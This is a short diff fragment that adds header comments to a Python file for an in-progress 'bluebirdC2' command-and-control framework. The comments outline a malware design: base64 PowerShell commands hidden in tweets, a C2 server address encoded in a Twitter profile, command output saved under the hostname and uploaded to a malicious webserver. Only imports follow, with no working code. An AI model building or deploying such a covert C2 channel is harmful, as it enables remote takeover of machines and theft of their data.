@@ -1,3 +1,10 @@
+#In progress bluebirdC2 framework
+
+#tweets from malicious user are base64 powershell commands that are grabbed via API
+#Domain name/IP address of malicious webserver are b64 encoded in the description of the twitter user
+#Commands are ran and saved to tmp directory under $hostname.txt
+#$hostname.txt is uploaded to malicious webserver
+
 import base64
 import subprocess
 import requests
